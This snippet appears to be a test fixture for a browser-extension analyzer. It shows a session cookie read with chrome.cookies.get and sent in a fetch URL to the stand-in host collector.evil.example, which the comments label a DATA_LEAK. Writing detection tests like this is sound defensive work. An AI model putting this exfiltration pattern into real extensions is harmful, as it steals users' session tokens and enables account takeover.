// URL exfiltration: the cookie value is concatenated into the fetch URL query
// string → FETCH_RESOURCE. This is NOT a header, so the header suppression does
// not apply — a cookie leaking through the URL is still DATA_LEAK.
chrome.cookies.get({ url: "https://api.self.example", name: "session" }, (cookie) => {
  fetch("https://collector.evil.example/c?session=" + cookie.value);
});
